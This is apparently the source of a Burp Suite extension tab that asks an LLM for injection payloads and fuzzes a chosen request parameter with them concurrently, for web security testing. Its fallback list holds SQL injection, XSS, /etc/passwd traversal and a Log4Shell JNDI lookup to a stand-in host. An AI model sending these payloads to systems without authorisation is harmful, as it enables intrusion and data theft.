# -*- coding: utf-8 -*-
"""
LLMFuzzerTab.py - Tab 2: LLM Context Fuzzer
Handles parameter extraction, LLM API call for payload generation, configuration persistence,
concurrent fuzzing execution, and payload injection.
"""

import threading
import json
import urllib2
from java.awt import BorderLayout, FlowLayout, Dimension, GridBagLayout, GridBagConstraints, Insets
from javax.swing import (
    JPanel, JButton, JLabel, JTextField, JTable, JScrollPane, JSplitPane,
    JComboBox, JSeparator, SwingUtilities, JOptionPane, ListSelectionModel
)
from javax.swing.table import DefaultTableModel

from ApexToolkitLogic import (
    LLMFuzzerEngine, log_info, log_error, save_setting, load_setting
)


class LLMFuzzerTab(object):
    def __init__(self, callbacks, helpers):
        self.callbacks = callbacks
        self.helpers = helpers
        self.current_http_service = None
        self.current_request_bytes = None
        self.extracted_params = []
        self.fuzz_results = []  # stores (payload, status, length, resp_obj)

        self._init_ui()
        self._load_saved_settings()

    def _init_ui(self):
        self.panel = JPanel(BorderLayout())

        # Top Configuration Bar
        config_panel = JPanel(FlowLayout(FlowLayout.LEFT, 8, 5))

        config_panel.add(JLabel("LLM API Key:"))
        self.txt_api_key = JTextField("", 16)
        config_panel.add(self.txt_api_key)

        config_panel.add(JLabel("API Endpoint:"))
        self.txt_api_url = JTextField("https://api.openai.com/v1/chat/completions", 22)
        config_panel.add(self.txt_api_url)

        self.btn_save_config = JButton("Save Config", actionPerformed=self._on_save_config)
        config_panel.add(self.btn_save_config)

        config_panel.add(JSeparator(1))

        config_panel.add(JLabel("Target Param:"))
        self.combo_params = JComboBox()
        self.combo_params.setPreferredSize(Dimension(140, 25))
        config_panel.add(self.combo_params)

        self.btn_fuzz = JButton("Generate Payloads & Fuzz", actionPerformed=self._on_generate_and_fuzz)
        config_panel.add(self.btn_fuzz)

        # Base Request Editor
        self.req_editor = self.callbacks.createMessageEditor(None, True)

        req_panel = JPanel(BorderLayout())
        req_panel.add(JLabel(" Base Request"), BorderLayout.NORTH)
        req_panel.add(self.req_editor.getComponent(), BorderLayout.CENTER)

        # Right Side: Results Table + Response Editor
        self.results_table_model = DefaultTableModel(["Payload", "Status", "Content Length"], 0)
        self.results_table = JTable(self.results_table_model)
        self.results_table.getSelectionModel().addListSelectionListener(self._on_row_selected)

        res_scroll = JScrollPane(self.results_table)

        self.resp_editor = self.callbacks.createMessageEditor(None, False)

        right_split = JSplitPane(JSplitPane.VERTICAL_SPLIT, res_scroll, self.resp_editor.getComponent())
        right_split.setResizeWeight(0.5)

        main_split = JSplitPane(JSplitPane.HORIZONTAL_SPLIT, req_panel, right_split)
        main_split.setResizeWeight(0.4)

        self.panel.add(config_panel, BorderLayout.NORTH)
        self.panel.add(main_split, BorderLayout.CENTER)

    def get_component(self):
        return self.panel

    def _load_saved_settings(self):
        key = load_setting(self.callbacks, "llm_api_key", "")
        url = load_setting(self.callbacks, "llm_api_url", "https://api.openai.com/v1/chat/completions")
        self.txt_api_key.setText(key)
        self.txt_api_url.setText(url)

    def _on_save_config(self, event):
        key = self.txt_api_key.getText().strip()
        url = self.txt_api_url.getText().strip()
        save_setting(self.callbacks, "llm_api_key", key)
        save_setting(self.callbacks, "llm_api_url", url)
        JOptionPane.showMessageDialog(self.panel, "LLM Fuzzer settings saved successfully.")

    def set_target_request(self, http_service, request_bytes):
        """
        Called when a request is sent to LLM Fuzzer via context menu or loaded into editor.
        """
        self.current_http_service = http_service
        self.current_request_bytes = request_bytes
        self.req_editor.setMessage(request_bytes, True)

        raw_req = self.helpers.bytesToString(request_bytes)
        self.extracted_params = LLMFuzzerEngine.extract_parameters(raw_req)

        def update_params_combo():
            self.combo_params.removeAllItems()
            if self.extracted_params:
                for p in self.extracted_params:
                    self.combo_params.addItem(p['name'] + " (" + p['type'] + ")")
            else:
                self.combo_params.addItem("No Params Found")

        SwingUtilities.invokeLater(update_params_combo)

    def _on_generate_and_fuzz(self, event):
        req_bytes = self.req_editor.getMessage()
        if not req_bytes or not self.current_http_service:
            JOptionPane.showMessageDialog(self.panel, "Please set a target request first.")
            return

        selected_param_idx = self.combo_params.getSelectedIndex()
        if selected_param_idx < 0 or selected_param_idx >= len(self.extracted_params):
            param_name = str(self.combo_params.getSelectedItem())
        else:
            param_name = self.extracted_params[selected_param_idx]['name']

        api_key = self.txt_api_key.getText().strip()
        api_url = self.txt_api_url.getText().strip()

        # Save configuration on fuzz start
        save_setting(self.callbacks, "llm_api_key", api_key)
        save_setting(self.callbacks, "llm_api_url", api_url)

        self.btn_fuzz.setEnabled(False)
        self.results_table_model.setRowCount(0)
        self.fuzz_results = []

        t = threading.Thread(
            target=self._fuzz_worker_thread,
            args=(req_bytes, param_name, api_key, api_url)
        )
        t.daemon = True
        t.start()

    def _fuzz_worker_thread(self, req_bytes, param_name, api_key, api_url):
        try:
            raw_req = self.helpers.bytesToString(req_bytes)
            payloads = []

            if api_key:
                payloads = self._call_llm_api(param_name, raw_req, api_key, api_url)

            if not payloads:
                payloads = [
                    "' OR '1'='1",
                    "\" OR \"1\"=\"1",
                    "<script>alert('xss')</script>",
                    "../../../../etc/passwd",
                    "${jndi:ldap://eval.com/a}",
                    "'; WAITFOR DELAY '0:0:5'--",
                    "1; SELECT pg_sleep(5)"
                ]

            # Parallel fuzzing using threads
            threads = []
            lock = threading.Lock()

            def execute_payload(payload):
                mutated_req_str = LLMFuzzerEngine.inject_payload(raw_req, param_name, payload)
                mutated_bytes = self.helpers.stringToBytes(mutated_req_str)

                try:
                    resp = self.callbacks.makeHttpRequest(self.current_http_service, mutated_bytes)
                    status = "N/A"
                    length = "N/A"
                    if resp and resp.getResponse():
                        resp_info = self.helpers.analyzeResponse(resp.getResponse())
                        status = str(resp_info.getStatusCode())
                        length = str(len(resp.getResponse()))

                    with lock:
                        self.fuzz_results.append((payload, status, length, resp))

                    def add_row(p=payload, s=status, l=length):
                        self.results_table_model.addRow([p, s, l])

                    SwingUtilities.invokeLater(add_row)
                except Exception as ex:
                    log_error(self.callbacks, "Fuzz payload request failed: " + str(payload), ex)

            for payload in payloads:
                t = threading.Thread(target=execute_payload, args=(payload,))
                t.daemon = True
                threads.append(t)
                t.start()

            for t in threads:
                t.join()

        except Exception as ex:
            log_error(self.callbacks, "LLM Fuzzer worker thread error", ex)
        finally:
            def reenable():
                self.btn_fuzz.setEnabled(True)
            SwingUtilities.invokeLater(reenable)

    def _call_llm_api(self, param_name, raw_req, api_key, api_url):
        prompt = LLMFuzzerEngine.build_prompt(param_name, raw_req)
        try:
            headers = {
                "Content-Type": "application/json",
                "Authorization": "Bearer " + api_key
            }
            body_data = {
                "model": "gpt-3.5-turbo",
                "messages": [
                    {"role": "user", "content": prompt}
                ],
                "temperature": 0.7
            }
            req = urllib2.Request(api_url, json.dumps(body_data), headers)
            res = urllib2.urlopen(req, timeout=10)
            json_resp = json.loads(res.read())

            if 'choices' in json_resp and json_resp['choices']:
                content = json_resp['choices'][0]['message']['content']
                return LLMFuzzerEngine.parse_llm_payloads(content)
        except Exception as ex:
            log_error(self.callbacks, "LLM API Call Error", ex)

        return []

    def _on_row_selected(self, event):
        if event.getValueIsAdjusting():
            return
        row = self.results_table.getSelectedRow()
        if 0 <= row < len(self.fuzz_results):
            resp_obj = self.fuzz_results[row][3]
            if resp_obj and resp_obj.getResponse():
                self.resp_editor.setMessage(resp_obj.getResponse(), False)
